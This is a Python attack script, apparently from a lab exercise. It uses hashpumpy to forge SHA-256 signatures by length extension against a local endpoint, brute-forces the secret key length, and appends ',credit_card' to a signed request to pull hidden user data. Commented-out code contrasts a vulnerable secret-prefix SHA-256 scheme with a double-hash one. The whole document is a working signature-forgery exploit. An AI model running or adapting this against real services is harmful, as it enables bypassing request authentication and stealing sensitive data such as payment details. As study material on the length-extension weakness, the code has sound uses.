from hashlib import sha256
from hashpumpy import hashpump
import requests, base64, sys

def sha256_hex(message):
	return sha256(message)\
			.hexdigest()

data = {
	'data_to_show': 'username',
	'signature': 'sdfsafsadfas',
}
append_data = ',credit_card'

url = 'http://localhost:5000/get_user_data'

def make_request(data):
	if not isinstance(data['data_to_show'], bytes):
		data['data_to_show'] = data['data_to_show'].encode()

	data['data_to_show'] = base64.b64encode(data['data_to_show'])

	r = requests.post(url, data=data)

	server_data = r.json()

	return server_data


# server_data = make_request(data)

# print(server_data)

# sys.exit()


signature = '77c635a441ad291897ff1b10cd20f3537ad8458d38295344275a4fe81c398594'

for i in range(1, 100):
	new_signature, new_full_message = hashpump(signature, data['data_to_show'], append_data, i)

	_data = dict()
	_data['signature'] = new_signature
	_data['data_to_show'] = new_full_message

	server_data = make_request(_data)
	
	if server_data.get('error', None) is None:
		print('KEY LENGTH: ', i)
		print('Data Sent:', new_full_message)
		print('Fake Signature:', new_signature)
		print('Server Response:', server_data)
		break



#libraries

#vulnerable

#no vulnerable

#search key length

# def sha256_hex(message):
# 	return sha256(message)\
# 			.hexdigest()

# def dbl_sha256_hex(message):
# 	return sha256_hex(sha256(message).digest())

# secret = 'sadfkasf242sdflasjfsajJLJasdsdsf1323' #UNKNOWN
# message = '&username=pepito&otro=true'
# full_message = secret + message

# signature = sha256_hex(full_message.encode())

# msg_to_append = '&credit_card=true'

# print(len(message), len(msg_to_append))

# new_signature, new_full_message = hashpump(signature, message, msg_to_append, len(secret))

# server_signature = sha256_hex( secret.encode() + new_full_message )

# print('VULNERABLE')
# print(server_signature)
# print(new_signature)
# print(server_signature == new_signature)

# signature = dbl_sha256_hex(full_message.encode())

# new_signature, new_full_message = hashpump(signature, message, msg_to_append, len(secret))

# server_signature = dbl_sha256_hex( secret.encode() + new_full_message )

# print('NO VULNERABLE')
# print(server_signature)
# print(new_signature)
# print(server_signature == new_signature)

# signature = sha256_hex(full_message.encode())

# server_signature = sha256_hex( secret.encode() + new_full_message )

# print('SEARCH LENGTH')

# for i in range(0, 200):	
# 	new_signature, new_full_message = hashpump(signature, message, msg_to_append, i)

# 	if server_signature == new_signature:
# 		print(new_full_message)
# 		break

# print('KEY LENGTH: ', i)
# print(server_signature)
# print(new_signature)
# print(server_signature == new_signature)